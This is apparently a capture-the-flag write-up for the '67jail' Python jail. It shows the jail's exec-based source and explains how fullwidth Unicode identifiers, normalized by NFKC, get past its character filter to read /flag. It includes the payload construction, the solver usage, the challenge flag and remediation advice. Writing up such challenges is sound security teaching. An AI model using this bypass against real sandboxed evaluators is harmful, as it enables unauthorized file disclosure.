# 67jail

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Miscellaneous / Python Jail |
| Difficulty | Baby |
| Points | 100 |
| Author | xzhiyouu |
| Connection | `nc chal.thjcc.org 9000` |
| Handout | [`artifacts/jail.py`](artifacts/jail.py) |
| Solver | [`solve.py`](solve.py) |
| Transcript | [`artifacts/protocol-transcript.txt`](artifacts/protocol-transcript.txt) |
| Flag | `THJCC{676767676767676767676767676767676767676767676767}` |

> 67676767

## TL;DR

The jail rejects ASCII alphanumeric characters and ordinary identifier
characters, but Python normalizes Unicode identifiers with NFKC while parsing
source code. Fullwidth identifiers such as `ｐｒｉｎｔ`, `ｏｐｅｎ`, `ｃｈｒ`, and
`ｒｅａｄ` pass the character filter and are compiled as `print`, `open`, `chr`,
and `read`. We construct every integer from `False` using repeated `-~`, build
`/flag` with `chr(...)` calls, read it, and pad the expression with spaces until
its length is exactly 6,767 characters.

## 1. Reading the Jail

The handout is short enough to audit line by line:

```python
import unicodedata
banned = {"print": print, "open": open, "chr": chr}

s = input(">> ")

if len(s) != 6767:
    exit("wrong length :(")

if any(c in s for c in "'\"_`\\#"):
    exit("that's not good :(")

if any(c.isascii() and c.isalnum() for c in s):
    exit("no no no!!!")

if s.count(";") > 1:
    exit("too many semicolons!")

for c in s:
    if c.isidentifier() and unicodedata.normalize("NFKC", c) == c:
        exit("bad:(((")

exec(s, {"__builtins__": banned}, {})
```

The restrictions are unusual:

1. The payload must contain exactly 6,767 Unicode characters.
2. Quotes, underscores, backticks, backslashes, and `#` are forbidden.
3. Every ASCII letter and digit is forbidden.
4. At most one semicolon is allowed.
5. A character is rejected when it is already an NFKC-stable identifier.
6. The only exposed builtins are `print`, `open`, and `chr`.

The fifth condition is the mistake. It does not reject every valid Unicode
identifier character. Instead, it explicitly permits identifier characters
whose NFKC-normalized forms differ from their original forms.

## 2. Python Normalizes Identifiers

Python supports non-ASCII identifiers. Before lookup, their spellings are
normalized using Unicode NFKC. Fullwidth Latin letters demonstrate the issue:

```python
unicodedata.normalize("NFKC", "ｐｒｉｎｔ") == "print"
unicodedata.normalize("NFKC", "ｏｐｅｎ")  == "open"
unicodedata.normalize("NFKC", "ｃｈｒ")   == "chr"
unicodedata.normalize("NFKC", "ｒｅａｄ")  == "read"
```

For each fullwidth character `c`:

- `c.isidentifier()` is true;
- `normalize("NFKC", c) == c` is false.

Therefore the jail's loop allows the character. Later, Python's parser
normalizes the complete identifier and looks up its ASCII equivalent. The
three normalized builtin names exist in the deliberately restricted namespace,
and normalized attribute access gives us the file object's `read` method.

The skeleton of the final expression can consequently be written as:

```python
ｐｒｉｎｔ(ｏｐｅｎ(PATH).ｒｅａｄ())
```

No ASCII letters appear in that source code.

## 3. Constructing Integers Without Digits

Quotes are forbidden, so the path cannot be entered as a normal string
literal. The exposed `chr` builtin lets us build it from character codepoints,
but ASCII digits are also forbidden.

An empty-list comparison provides zero:

```python
([]<[])      # False, numerically equal to 0
```

The identity `-~x == x + 1` then generates any non-negative integer. For
example:

```python
-~([]<[])            # 1
-~-~-~([]<[])         # 3
```

The solver represents an integer `n` as `n` repetitions of `-~` followed by
`([]<[])`:

```python
def integer(value):
    return "-~" * value + "([]<[])"
```

This is not compact, but the required 6,767-character payload gives us ample
space. The largest codepoint needed for `/flag` is only 108.

## 4. Constructing `/flag`

The fullwidth spelling `ｃｈｒ` normalizes to the exposed `chr` builtin. Each
path character is produced separately and concatenated with `+`:

```text
ｃｈｒ(<47>)+ｃｈｒ(<102>)+ｃｈｒ(<108>)+ｃｈｒ(<97>)+ｃｈｒ(<103>)
   /           f            l           a           g
```

Here every `<n>` is replaced by the digit-free `-~...([]<[])` expression from
the previous section. Substituting this string expression into the skeleton
produces:

```python
ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(<47>)+...+ｃｈｒ(<103>)).ｒｅａｄ())
```

This reads `/flag` and prints its contents without using a quote, ASCII
identifier, digit, underscore, or banned punctuation character.

## 5. Satisfying the Exact Length

Python ignores trailing spaces after an expression, while the jail counts them
as part of the input string. We append exactly enough spaces to reach the
required length:

```python
payload += " " * (6767 - len(payload))
assert len(payload) == 6767
```

Spaces are not identifiers or ASCII alphanumeric characters, and the payload
uses no semicolon at all. They are therefore ideal inert padding.

## 6. Remote Authentication Wrapper

The network service asks for a CTFd API token before presenting the jail. It
then asks the client to select `Human` and echo a random decimal nonce. This is
transport-level verification rather than part of the Python escape.

[`solve.py`](solve.py) handles the complete exchange:

1. Read the token from `CTFD_TOKEN`, `--token`, or a hidden prompt.
2. Select option `3` for `Human`.
3. Extract and return the server's random nonce.
4. Wait for the jail prompt.
5. Send the UTF-8 payload and extract the flag.

No token is hardcoded or stored in the repository. Run the solver with:

```bash
export CTFD_TOKEN='ctfd_your_token_here'
python3 solve.py
```

Alternatively, omit the environment variable and enter the token at the hidden
prompt:

```bash
python3 solve.py
```

Expected output:

```text
[+] payload length: 6767
[+] flag: THJCC{676767676767676767676767676767676767676767676767}
```

## Why It Works

The filter validates individual source characters, but Python executes the
normalized token stream. Those are different representations of the program.
The jail even calls NFKC itself, but its equality test selects precisely the
characters whose normalized form changes, which are the characters useful for
the bypass.

Restricting `__builtins__` does not help because all three primitives needed
for file disclosure were intentionally exposed:

- `chr` constructs arbitrary strings;
- `open` accesses arbitrary paths;
- `print` returns file contents to the client.

## Remediation

- Do not pass untrusted input to `exec`, even with a reduced builtin mapping.
- Normalize the entire program before validation and reject it if
  normalization changes any character.
- Parse input into an AST and allow only the exact operations required by the
  application; do not validate source one character at a time.
- Never expose filesystem primitives such as `open` to untrusted expressions.
- Run any unavoidable evaluator in a separate, unprivileged process with a
  read-only filesystem that does not contain secrets.

## Flag

```text
THJCC{676767676767676767676767676767676767676767676767}
```
